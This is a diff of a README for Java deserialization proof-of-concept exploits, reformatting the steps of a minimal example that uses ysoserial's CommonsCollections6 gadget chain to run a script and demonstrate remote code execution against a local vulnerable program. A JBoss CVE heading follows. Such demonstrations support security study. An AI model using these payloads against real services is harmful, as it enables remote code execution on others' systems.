@@ -7,13 +7,15 @@ These PoCs use the [ysoserial](https://github.com/frohoff/ysoserial/) tool to ge
 Minimal Example
 ---------------------------------
 - Use java 8
-- cd MinimalExample
-- java -jar ../ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections6 "/tmp/exploit.sh">payload.ser 
-- cp ./exploit.sh /tmp
-- chmod +x /tmp/exploit.sh
-- javac Employee.java
-- javac DeSerializingObject.java
-- java -classpath .:apache-collections-commons-collections-3.1.jar DeSerializingObject 
+```
+cd MinimalExample
+java -jar ../ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections6 "/tmp/exploit.sh">payload.ser 
+cp ./exploit.sh /tmp
+chmod +x /tmp/exploit.sh
+javac Employee.java
+javac DeSerializingObject.java
+java -classpath .:apache-collections-commons-collections-3.1.jar DeSerializingObject 
+```
 - You will find a file "pwned" in /tmp. This means that the attack has been completed correctly with a RCE.
 
 JBOSS (CVE-2016-7065)
